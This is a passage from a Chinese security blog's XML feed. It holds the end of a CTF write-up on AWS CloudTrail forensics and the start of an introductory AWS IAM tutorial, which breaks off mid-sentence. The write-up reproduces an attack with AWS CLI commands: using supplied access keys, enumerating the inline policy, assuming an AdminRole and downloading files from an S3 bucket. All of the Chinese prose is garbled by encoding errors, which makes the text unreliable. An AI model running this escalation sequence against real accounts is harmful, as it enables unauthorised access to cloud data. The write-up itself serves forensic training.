‡è¾¾æˆé˜¶æ®µ</h4><p>ç»ˆäºï¼Œæˆ‘ä»¬æ¥åˆ°æœ€åä¸€ä¸ªæ—¥å¿—æ–‡ä»¶<code>T2120Z</code>ã€‚åœ¨ä¹‹å‰çš„åˆ†æä¸­ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°æ”»å‡»è€…å¯èƒ½å¯¹<code>emergency-data-recovery</code> S3 å­˜å‚¨æ¡¶æ„Ÿå…´è¶£ã€‚æˆ‘ä»¬å‘ç°æ”»å‡»è€…å°è¯•åˆ—å‡ºå¹¶æ£€ç´¢å†…å®¹ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep eventName 107513503799_CloudTrail_us-east-1_20230826T2120Z_UCUhsJa0zoFY3ZO0.json<br></code></pre></td></tr></table></figure><p><img src="/image/image_31ajij-feV.png"></p><p>æŸ¥çœ‹ GetObject çš„å…·ä½“æ“ä½œï¼Œæˆ‘ä»¬å‘ç°<code>emergency.txt</code> æ–‡ä»¶å·²è¢«ä¸‹è½½ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grep -A 20 GetObject 107513503799_CloudTrail_us-east-1_20230826T2120Z_UCUhsJa0zoFY3ZO0.json<br></code></pre></td></tr></table></figure><p><img src="/image/image_ugkDi9VjOp.png"></p><h3 id="6-4-å¤ç°æ”»å‡»è¿‡ç¨‹"><a href="#6-4-å¤ç°æ”»å‡»è¿‡ç¨‹" class="headerlink" title="6.4 å¤ç°æ”»å‡»è¿‡ç¨‹"></a>6.4 å¤ç°æ”»å‡»è¿‡ç¨‹</h3><h4 id="6-4-1-é…ç½®-AWS-CLI"><a href="#6-4-1-é…ç½®-AWS-CLI" class="headerlink" title="6.4.1 é…ç½® AWS CLI"></a>6.4.1 é…ç½® AWS CLI</h4><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¤ç°æ”»å‡»è€…çš„æ“ä½œæ­¥éª¤äº†ã€‚æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œä¸ºæœ¬åœ°ç¯å¢ƒè®¾ç½®è®¤è¯ä¿¡æ¯ï¼ˆ<code>Access Key ID</code>å’Œ<code>Secret Access Key</code>å·²åœ¨é¢˜ç›®ä¸­æä¾›äº†ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws configure<br></code></pre></td></tr></table></figure><p><img src="/image/image_EfjrwaMJot.png"></p><p>æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼ŒæŸ¥è¯¢å½“å‰ AWS å‡­è¯ï¼ˆAccess Keyï¼‰æ‰€å¯¹åº”çš„èº«ä»½ä¿¡æ¯ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws sts get-caller-identity<br></code></pre></td></tr></table></figure><p><img src="/image/image_I3TS12JwX-.png"></p><h4 id="6-4-2-æŸ¥çœ‹ç”¨æˆ·ç­–ç•¥"><a href="#6-4-2-æŸ¥çœ‹ç”¨æˆ·ç­–ç•¥" class="headerlink" title="6.4.2 æŸ¥çœ‹ç”¨æˆ·ç­–ç•¥"></a>6.4.2 æŸ¥çœ‹ç”¨æˆ·ç­–ç•¥</h4><p>è®©æˆ‘ä»¬çœ‹çœ‹æ˜¯å¦æœ‰ä»»ä½•å†…è”ç”¨æˆ·ç­–ç•¥é™„åŠ åˆ°æˆ‘ä»¬çš„ IAM ç”¨æˆ·ã€‚è¿™é‡Œæˆ‘ä»¬æŸ¥çœ‹åˆ°ä¸€ä¸ªåä¸º<code>test-temp-user</code> çš„ç­–ç•¥ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws iam list-user-policies --user-name temp-user<br></code></pre></td></tr></table></figure><p><img src="/image/image_yj9qxXmu93.png"></p><p>æˆ‘ä»¬æ£€æŸ¥è¯¥ç­–ç•¥ï¼Œå‘ç°ç”¨æˆ·è¢«å…è®¸æ‰®æ¼”<code>AdminRole</code>çš„è§’è‰²ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws iam get-user-policy --user-name temp-user --policy-name test-temp-user<br></code></pre></td></tr></table></figure><p><img src="/image/image_jEkGGN9-UL.png"></p><h4 id="6-4-3-Assume-Role-æ“ä½œ"><a href="#6-4-3-Assume-Role-æ“ä½œ" class="headerlink" title="6.4.3 Assume Role æ“ä½œ"></a>6.4.3 Assume Role æ“ä½œ</h4><p>ç¡®å®šäº†è§’è‰²è¿‡åï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼Œå°è¯•æ¥ç®¡è¯¥è§’è‰²ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws sts assume-role --role-arn arn:aws:iam::107513503799:role/AdminRole --role-session-name MySession<br></code></pre></td></tr></table></figure><p><img src="/image/image_g88bPqwwlg.png"></p><p>è¦æ‰®æ¼”è¿™ä¸ªè§’è‰²ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¿›è¡Œè®¾ç½®ã€‚è®¾ç½®æ‰€éœ€è¦çš„å‡­è¯ï¼Œè¯·å‚è€ƒä¸Šä¸€ä¸ªæ­¥éª¤çš„è¾“å‡ºã€‚è®¾ç½®ç»“æŸåå¯ä»¥éªŒè¯ä¸€ä¸‹ä¸Šä¸‹æ–‡ä¿¡æ¯ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws configure<br>aws configure <span class="hljs-built_in">set</span> aws_session_token &lt;session_token&gt;<br>aws sts get-caller-identity<br><br></code></pre></td></tr></table></figure><p><img src="/image/image_zyviouoJL1.png"></p><h4 id="6-4-4-è®¿é—®å­˜å‚¨æ¡¶"><a href="#6-4-4-è®¿é—®å­˜å‚¨æ¡¶" class="headerlink" title="6.4.4 è®¿é—®å­˜å‚¨æ¡¶"></a>6.4.4 è®¿é—®å­˜å‚¨æ¡¶</h4><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ—å‡ºå­˜å‚¨æ¡¶å†…å®¹å¹¶æ£€ç´¢æ–‡ä»¶äº†ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws s3 <span class="hljs-built_in">ls</span> s3://emergency-data-recovery<br></code></pre></td></tr></table></figure><p><img src="/image/image_iTUFAn34bd.png"></p><p>æœ€åï¼Œæˆ‘ä»¬ä¸‹è½½æ–‡ä»¶ï¼Œflag å°±åœ¨æ–‡ä»¶ä¸­ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws s3 <span class="hljs-built_in">cp</span> s3://emergency-data-recovery/emergency.txt .<br>aws s3 <span class="hljs-built_in">cp</span> s3://emergency-data-recovery/message.txt .<br></code></pre></td></tr></table></figure><p><img src="/image/image_0hb2e0-wsX.png"></p><h2 id="0x07-æ€»ç»“"><a href="#0x07-æ€»ç»“" class="headerlink" title="0x07 æ€»ç»“"></a>0x07 æ€»ç»“</h2><p>æœ¬é¢˜è€ƒå¯Ÿäº†æ”»å‡»è€…åœ¨ AWS ç¯å¢ƒä¸­çš„å…¸å‹æ”»å‡»è·¯å¾„ï¼š</p><ul><li>å‡­è¯æ»¥ç”¨ â èº«ä»½ä¾¦å¯Ÿ â æƒé™æšä¸¾ â ææƒ â æ•°æ®è®¿é—®</li><li>åŒæ—¶æ¶‰åŠ CloudTrail æ—¥å¿—åˆ†æã€IAM ç­–ç•¥ç†è§£ã€CLI å·¥å…·ä½¿ç”¨ã€ä»¥åŠ S3 å­˜å‚¨æ¡¶æ•°æ®å–è¯ã€‚</li></ul><p>è¿™æ˜¯ä¸€æ¬¡å®Œæ•´çš„<strong>äº‘ç¯å¢ƒå…¥ä¾µæº¯æºå®æˆ˜æ¼”ç»ƒ</strong>ï¼Œéå¸¸é€‚åˆä½œä¸ºçº¢è“å¯¹æŠ—ä¸äº‘å®‰å…¨å–è¯çš„å­¦ä¹ æ¡ˆä¾‹ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>AWS å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ— ç—›å­¦ä¹  AWS çš„èº«ä»½ä¸è®¿é—®ç®¡ç†ï¼ˆIAMï¼‰</title>
    <link href="/2025/04/29/%E6%97%A0%E7%97%9B%E5%AD%A6%E4%B9%A0-AWS-%E7%9A%84%E8%BA%AB%E4%BB%BD%E4%B8%8E%E8%AE%BF%E9%97%AE%E7%AE%A1%E7%90%86%EF%BC%88IAM%EF%BC%89/"/>
    <url>/2025/04/29/%E6%97%A0%E7%97%9B%E5%AD%A6%E4%B9%A0-AWS-%E7%9A%84%E8%BA%AB%E4%BB%BD%E4%B8%8E%E8%AE%BF%E9%97%AE%E7%AE%A1%E7%90%86%EF%BC%88IAM%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>ä»Šå¤©ï¼Œæˆ‘ä»¬ä»¥åˆå­¦è€…çš„è§†è§’æ¥å­¦ä¹  AWS çš„èº«ä»½ä¸è®¿é—®ç®¡ç†ï¼ˆIdentity and Access Managementï¼Œæœ¬æ–‡ç®€ç§° IAMï¼‰ã€‚</p><ul><li>é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦å…ˆäº†è§£ IAMã€è®¤è¯å’Œæˆæƒçš„åŸºæœ¬æ¦‚å¿µï¼ˆIAM æŒ‡çš„æ˜¯åŸºäºç­–ç•¥ï¼Œæ§åˆ¶æŸäº›èº«ä»½å¯ä»¥è®¿é—®æŸäº›èµ„æºï¼‰ï¼›</li><li>ç„¶åï¼Œæˆ‘ä»¬å±•å¼€è¯´æ˜ä»€ä¹ˆæ˜¯èº«ä»½ï¼ˆIAM ç”¨æˆ·ã€ç”¨æˆ·ç»„å’Œè§’è‰²ï¼‰ä»¥åŠä¸è§’è‰²ç›¸å…³çš„ IAM ç­–ç•¥æœ‰å“ªäº›ï¼Œå…¶å·¥ä½œæ–¹å¼æ˜¯ä»€ä¹ˆï¼›</li><li>æ¥ç€ï¼Œæˆ‘ä»¬é€šè¿‡ä¸€ä¸ªæŠ«è¨åº—çš„ä¾‹å­æ¥è¿›ä¸€æ­¥å·©å›º IAM çš„ç›¸å…³æ¦‚å¿µï¼›</li><li>æœ€åï¼Œé€šè¿‡ EC2 è®¿é—® S3 çš„ç¤ºä¾‹åœºæ™¯è¿›è¡Œæ”¶å°¾ã€‚</li></ul><h2 id="0x01-åŸºæœ¬æ¦‚å¿µ"><a href="#0x01-åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="0x01 åŸºæœ¬æ¦‚å¿µ"></a>0x01 åŸºæœ¬æ¦‚å¿µ</h2><h3 id="1-1-ç›¸å…³å®šä¹‰"><a href="#1-1-ç›¸å…³å®šä¹‰" class="headerlink" title="1.1 ç›¸å…³å®šä¹‰"></a>1.1 ç›¸å…³å®šä¹‰</h3><p>IAM å¯ä»¥è®©æˆ‘ä»¬åŸºäºé¢„å®šä¹‰çš„ <strong>æƒé™ï¼ˆpermissionsï¼‰</strong> æ§åˆ¶ <strong>è°ï¼ˆwhoï¼‰</strong> å¯ä»¥è®¿é—®æˆ‘ä»¬çš„ AWS æœåŠ¡å’Œèµ„æºã€‚</p><ul><li>è°ï¼ˆwhoï¼‰ï¼šæŒ‡çš„æ˜¯æŸä¸ªèº«ä»½ï¼Œå¯èƒ½æ˜¯ç”¨æˆ·ï¼ˆuserï¼‰ã€ç”¨æˆ·ç»„ï¼ˆgroupï¼‰æˆ–è§’è‰²ï¼ˆroleï¼‰ï¼›</li><li>æƒé™ï¼ˆpermissionsï¼‰ï¼šæŒ‡çš„æ˜¯é™„åŠ åœ¨è¿™äº›èº«ä»½ä¸Šçš„ç­–ç•¥ï¼ˆpolicyï¼‰ï¼Œè¿™äº›ç­–ç•¥å†³å®šäº†å“ªäº›èº«ä»½æ˜¯å¦å¯ä»¥è®¿é—®æŸäº›èµ„æºã€‚</li></ul><h3 id="1-2-è®¤è¯-vs-æˆæƒ"><a href="#1-2-è®¤è¯-vs-æˆæƒ" class="headerlink" title="1.2 è®¤è¯ vs æˆæƒ"></a>1.2 è®¤è¯ vs æˆæƒ</h3><p>IAM æ˜¯ AWS ç”¨äºå¯¹èº«ä»½è¿›è¡Œ<strong>è®¤è¯ï¼ˆauthenticationï¼‰</strong> å’Œ <strong>æˆæƒï¼ˆauthorizationï¼‰</strong> çš„æ–¹å¼ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè®¤è¯å’Œæˆæƒå¹¶ä¸ç›¸åŒã€‚</p><ul><li>è®¤è¯ï¼šå…³æ³¨çš„æ˜¯â€œä½ æ˜¯è°ï¼Ÿâ€ï¼›</li><li>æˆæƒï¼šå…³æ³¨çš„æ˜¯â€œä½ èƒ½åšä»€ä¹ˆï¼Ÿâ€ã€‚</li></ul><p>è®¤è¯æ˜¯æŒ‡ä¸€ä¸ªèº«ä»½è¯æ˜è‡ªå·±æ˜¯å…¶æ‰€å£°ç§°çš„å¯¹è±¡ã€‚è€Œæˆæƒæ˜¯æŒ‡ä½ è¯æ˜è‡ªå·±æœ‰è®¿é—®æŸèµ„æºçš„æƒé™ã€‚ä¾‹å¦‚ï¼šè‹¥æˆ‘ä»¬è¦åé£æœºï¼Œå°±å¿…é¡»ç»è¿‡è®¤è¯å’Œæˆæƒä¸¤ä¸ªè¿‡ç¨‹ã€‚</p><ul><li>è®¤è¯ï¼šé€šè¿‡æŠ¤ç…§æˆ–èº«ä»½è¯æ¥å®Œæˆçš„ï¼Œå®‰æ£€äººå‘˜ä¼šæ ¸å¯¹æˆ‘ä»¬çš„ç…§ç‰‡æ˜¯å¦ä¸æœ¬äººåŒ¹é…ï¼Œè¿™å°±è¯æ˜äº†â€œä½ æ˜¯è°â€ã€‚</li><li>æˆæƒï¼šé€šè¿‡ç™»æœºç‰Œæ¥å®Œæˆçš„ï¼Œå®ƒè¯æ˜æˆ‘ä»¬æœ‰æƒç™»ä¸ŠæŸä¸€èˆªç­ã€‚</li></ul><p>æˆ‘ä»¬éœ€è¦å®Œæˆè¿™ä¸¤æ­¥æ‰èƒ½ç™»æœºã€‚åŒç†ï¼Œè®¿é—® AWS èµ„æºä¹Ÿéœ€è¦å®Œæˆè®¤è¯å’Œæˆæƒã€‚è‹¥è¦æ·±å…¥äº†è§£è®¤è¯å’Œæˆæƒçš„åŒºåˆ«ï¼Œå¯ä»¥çœ‹è¿™ç¯‡åšå®¢<a href="https://www.freecodecamp.org/news/whats-the-difference-between-authentication-and-authorisation/" title="ã€ŠAuthentication vs Authorization â€“ What&#39;s the Difference?ã€‹">ã€ŠAuthentication vs Authorization â€“ Whatâ€™s the Difference?ã€‹</a></p><p><img src="/image/image_gIdy3nVrwa.png"></p><h2 id="0x02-èº«ä»½"><a href="#0x02-èº«ä»½" class="headerlink" title="0x02 èº«ä»½"></a>0x02 èº«ä»½</h2><h3 id="2-1-IAM-ç”¨æˆ·ï¼ˆUserï¼‰"><a href="#2-1-IAM-ç”¨æˆ·ï¼ˆUserï¼‰" class="headerlink" title="2.1 IAM ç”¨æˆ·ï¼ˆUserï¼‰"></a>2.1 IAM ç”¨æˆ·ï¼ˆUserï¼‰</h3><p>IAM ç”¨æˆ·æŒ‡çš„æ˜¯ä»»ä½•éœ€è¦ <strong>é•¿æœŸè®¿é—®</strong> AWS èµ„æºçš„èº«ä»½ï¼ˆå¯ä»¥æ˜¯äººï¼Œä¹Ÿå¯ä»¥æ˜¯åº”ç”¨ï¼‰ã€‚åœ¨ä¸ AWS èµ„æºè¿›è¡Œäº¤äº’ä¹‹å‰ï¼ŒIAM ç”¨æˆ·ä¼šå‘ IAM å‘èµ·è¯·æ±‚è¿›è¡Œè®¤è¯ã€‚ä¾‹å¦‚ï¼š</p><ul><li>äººä»¬å¯ä»¥é€šè¿‡ç”¨æˆ·åå’Œå¯†ç è®¤è¯æ¥è®¿é—®æ§åˆ¶å°ï¼›</li><li>åº”ç”¨ç¨‹åºæˆ– CLI ç”¨æˆ·é€šè¿‡è®¿é—®å¯†é’¥è¿›è¡Œè®¤è¯ã€‚</li></ul><h3 id="2-2-IAM-ç”¨æˆ·ç»„ï¼ˆGroupï¼‰"><a href="#2-2-IAM-ç”¨æˆ·ç»„ï¼ˆGroupï¼‰" class="headerlink" title="2.2 IAM ç”¨æˆ·ç»„ï¼ˆGroupï¼‰"></a>2.2 IAM ç”¨æˆ·ç»„ï¼ˆGroupï¼‰</h3><p><strong>IAM ç”¨æˆ·å¯ä»¥è¢«æ”¾ç½®åˆ°ç”¨æˆ·ç»„ä¸­</strong>ã€‚ç”¨æˆ·ç»„ä¾¿äºåœ¨ç”¨æˆ·é‡è¾ƒå¤§æ—¶è¿›è¡Œæƒé™ç®¡ç†ã€‚ç›¸æ¯”ä¸ºæ¯ä½ç”¨æˆ·å•ç‹¬é…ç½®æƒé™ï¼ŒæŒ‰ç»„è®¾ç½®æ›´å…·å¯æ‰©å±•æ€§ã€‚</p><p>ä¾‹å¦‚ï¼šæœ‰ä¸€ä¸ªåŒ…å«å¼€å‘ã€æ¶æ„å¸ˆã€è¿ç»´ã€æµ‹è¯•ç­‰å›¢é˜Ÿçš„ç»„ç»‡ï¼Œæ¯ä¸ªå›¢é˜Ÿæœ‰ 10 äººï¼Œæ€»å…± 60 äººã€‚æˆ‘ä»¬å¯ä»¥æŒ‰å›¢é˜Ÿåˆ’åˆ†ç”¨æˆ·ç»„ï¼Œç„¶åä¸ºæ¯ä¸ªç»„é…ç½®æƒé™ï¼Œè¿™æ ·ç®¡ç†æ›´é«˜æ•ˆã€‚</p><ul><li>ç”¨æˆ·ç»„æœ¬èº«ä¸å…·å¤‡ç™»å½•å‡­è¯ã€‚ç”¨æˆ·ç»„åœ¨ AWS ä¸­åªæ˜¯ä¸€ä¸ªé€»è¾‘å®¹å™¨ï¼Œç”¨äºå°†å¤šä¸ªç”¨æˆ·èšåˆåœ¨ä¸€èµ·ï¼Œä»¥ä¾¿ç»Ÿä¸€åˆ†é…æƒé™ç­–ç•¥ï¼ˆpolicyï¼‰ã€‚å®ƒæœ¬èº«å¹¶ä¸æ˜¯ä¸€ä¸ªå¯ä»¥å•ç‹¬è¿›è¡Œèº«ä»½éªŒè¯ï¼ˆç™»å½•ï¼‰çš„å®ä½“ã€‚</li><li>ç”¨æˆ·å¯ä»¥å±äºå¤šä¸ªç»„ï¼Œä¾‹å¦‚æŸä¸ª DevOps å·¥ç¨‹å¸ˆä¹Ÿå¯èƒ½æ˜¯çº¿ä¸Šæ”¯æŒå›¢é˜Ÿçš„ä¸€å‘˜ã€‚</li></ul><p><img src="/image/ChatGPT%20Image%202025%E5%B9%B44%E6%9C%8829%E6%97%A5%2016_46_39_qcpu5bWSv_.png"></p><h3 id="2-3-IAM-è§’è‰²ï¼ˆRoleï¼‰"><a href="#2-3-IAM-è§’è‰²ï¼ˆRoleï¼‰" class="headerlink" title="2.3 IAM è§’è‰²ï¼ˆRoleï¼‰"></a>2.3 IAM è§’è‰²ï¼ˆRoleï¼‰</h3><p>IAM è§’è‰²å¯ä»¥å‘å¤šä¸ªèº«ä»½ï¼ˆå¦‚å¤–éƒ¨ç”¨æˆ·ã€AWS æœåŠ¡æˆ–åº”ç”¨ç¨‹åºï¼‰æˆäºˆ<strong>ä¸´æ—¶è®¿é—®æƒé™</strong>ã€‚è¿™äº›èº«ä»½ä¸´æ—¶â€œæ‰®æ¼”â€è§’è‰²ï¼Œå¹¶ç»§æ‰¿è§’è‰²ä¸Šé™„åŠ çš„æƒé™ç­–ç•¥ã€‚</p><p>ç”±äº IAM ç”¨æˆ·æ•°é‡æœ‰é™ï¼ˆå½“å‰æœ€å¤š 5000 ä¸ªï¼‰ï¼ŒIAM è§’è‰²æ˜¯å¤§è§„æ¨¡èº«ä»½è®¿é—®æ§åˆ¶çš„é‡è¦æ‰‹æ®µã€‚è¯¦æƒ…è¯·çœ‹å®˜æ–¹æ–‡æ¡£<a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_iam-quotas.html" title="ã€ŠIAM and AWS STS quotasã€‹">ã€ŠIAM and AWS STS quotasã€‹</a></p><h2 id="0x03-ç­–ç•¥"><a href="#0x03-ç­–ç•¥" class="headerlink" title="0x03 ç­–ç•¥"></a>0x03 ç­–ç•¥</h2><h3 id="3-1-IAM-è§’è‰²ç­–ç•¥"><a href="#3-1-IAM-è§’è‰²ç­–ç•¥" class="headerlink" title="3.1 IAM è§’è‰²ç­–ç•¥"></a>3.1 IAM è§’è‰²ç­–ç•¥</h3><p>ä¸è§’è‰²ç›¸å…³çš„ IAM ç­–ç•¥æœ‰ <strong>ä¿¡ä»»ç­–ç•¥ï¼ˆtrust policyï¼‰</strong> å’Œ <strong>æƒé™ç­–ç•¥ï¼ˆpermission policyï¼‰</strong> ä¸¤ç§ç±»å‹ï¼š</p><ul><li>ä¿¡ä»»ç­–ç•¥ï¼šå®šä¹‰å“ªäº›èº«ä»½å¯ä»¥æ‹…ä»»è¯¥è§’è‰²ã€‚ä¸€æ—¦æŸä¸ªèº«ä»½æ‹…ä»»äº†è¯¥è§’è‰²ï¼ŒAWS å°±ä¼šå‘å…¶é¢å‘<a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp.html" title="ä¸´æ—¶å®‰å…¨å‡­è¯">ä¸´æ—¶å®‰å…¨å‡­è¯</a>ã€‚è¿™é‡Œçš„èº«ä»½å¯ä»¥æ˜¯ IAM ç”¨æˆ·ã€AWS èµ„æºï¼ˆä¾‹å¦‚ EC2 å®ä¾‹ï¼‰å’ŒåŒ¿åå®ä½“ç­‰ã€‚</li><li>æƒé™ç­–ç•¥ï¼šå®šä¹‰è¯¥è§’è‰²æ‹¥æœ‰çš„æƒé™ï¼Œä»è€Œé—´æ¥å®šä¹‰å‡æ‰®è¯¥è§’è‰²çš„èº«ä»½æ‰€æ‹¥æœ‰çš„æƒé™ã€‚</li></ul><p>æ³¨æ„ï¼Œä¿¡ä»»ç­–ç•¥ä¸‹çš„èº«ä»½è®¤è¯æ˜¯æœ‰æ—¶é—´é™åˆ¶çš„ï¼Œåˆ°æœŸåéœ€é‡æ–°è®¤è¯è·å–æ–°å‡­è¯ã€‚</p><h3 id="3-2-IAM-ç­–ç•¥çš„å·¥ä½œæ–¹å¼"><a href="#3-2-IAM-ç­–ç•¥çš„å·¥ä½œæ–¹å¼" class="headerlink" title="3.2 IAM ç­–ç•¥çš„å·¥ä½œæ–¹å¼"></a>3.2 IAM ç­–ç•¥çš„å·¥ä½œæ–¹å¼</h3><p>IAM ç­–ç•¥é™„åŠ åœ¨èº«ä»½ï¼ˆç”¨æˆ·ã€ç”¨æˆ·ç»„æˆ–è§’è‰²ï¼‰æˆ–æŸäº› AWS èµ„æºä¸Šï¼ˆæ­¤ç±»ç­–ç•¥ç§°ä¸ºâ€œ<a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_identity-vs-resource.html" title="åŸºäºèµ„æºçš„ç­–ç•¥">åŸºäºèµ„æºçš„ç­–ç•¥</a>â€ï¼‰ã€‚è¿™äº›ç­–ç•¥æ˜¯ JSON æ–‡æ¡£ï¼Œç”±å¤šä¸ª<strong>å£°æ˜ï¼ˆstatementï¼‰</strong> ç»„æˆï¼Œè¡¨ç¤ºå¯ä»¥å…è®¸æˆ–æ‹’ç»æŸäº›æ“ä½œã€‚</p><p>ä¸‹é¢æ˜¯æˆäºˆæŸèº«ä»½å¯¹æŸä¸ª S3 æ¡¶è¯»å†™æƒé™çš„ç¤ºä¾‹ç­–ç•¥ï¼Œé»˜è®¤æƒ…å†µä¸‹æ‰€æœ‰è¯·æ±‚éƒ½è¢«æ‹’ç»ï¼Œåªæœ‰ç­–ç•¥æ˜¾å¼å£°æ˜å…è®¸ï¼ˆAllowï¼‰æ‰ä¼šæ”¾è¡Œã€‚è¿™ä½“ç°äº†â€œæœ€å°æƒé™åŸåˆ™â€ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;Version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2012-10-17&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;Statement&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;Sid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ListObjectsInBucket&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Effect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Allow&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;s3:ListBucket&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;arn:aws:s3:::bucket-name&quot;</span><span class="hljs-punctuation">]</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;Sid&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;AllObjectActions&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Effect&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Allow&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Action&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;s3:*Object&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;Resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;arn:aws:s3:::bucket-name/*&quot;</span><span class="hljs-punctuation">]</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><ul><li><code>Version</code>ï¼šç­–ç•¥è¯­è¨€çš„ç‰ˆæœ¬ï¼Œæ­¤å¤„ä¸º<code>&quot;2012-10-17&quot;</code>ï¼Œæ˜¯å½“å‰æ¨èä½¿ç”¨çš„ç‰ˆæœ¬ï¼›</li><li><code>Statement</code>ï¼šå£°æ˜åˆ—è¡¨ï¼Œæ¯ä¸€é¡¹æè¿°ä¸€æ¡æƒé™è§„åˆ™ï¼›</li><li><code>Sid</code>ï¼šå£°æ˜ IDï¼ˆå¯é€‰ï¼‰ï¼Œç”¨äºå¸®åŠ©ç†è§£ç­–ç•¥çš„ç”¨é€”ã€‚<code>ListObjectsInBucket</code>è¡¨ç¤ºåˆ—å‡ºæ¡¶å†…å¯¹è±¡ï¼Œ<code>AllObjectActions</code>è¡¨ç¤ºå¯¹æ¡¶ä¸­æ‰€æœ‰å¯¹è±¡çš„æ‰€æœ‰æ“ä½œï¼›</li><li><code>Effect</code>ï¼šå…è®¸ï¼ˆAllowï¼‰æˆ–æ‹’ç»ï¼ˆDenyï¼‰ï¼›</li><li><code>Action</code>ï¼šè¦æ‰§è¡Œçš„æ“ä½œï¼Œæ ¼å¼ä¸º <code>æœåŠ¡:æ“ä½œ</code>ã€‚<code>s3:ListBucket</code>è¡¨ç¤ºåˆ—å‡º S3 æ¡¶ä¸­çš„å¯¹è±¡ï¼Œ<code>s3:*Object</code>è¡¨ç¤ºæ‰€æœ‰ä»¥<code>*Object</code>ç»“å°¾çš„æ“ä½œï¼Œå¦‚<code>s3:GetObject</code>ã€<code>s3:PutObject</code> ç­‰ï¼›</li><li><code>Resource</code>ï¼šæ“ä½œæ¶‰åŠçš„èµ„æºï¼Œé€šå¸¸ä»¥ <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/reference-arns.html" title="ARN">ARN</a>ï¼ˆAmazon èµ„æºåç§°ï¼‰è¡¨ç¤ºã€‚<code>arn:aws:s3:::bucket-name</code> è¡¨ç¤ºæŒ‡å®šçš„ S3 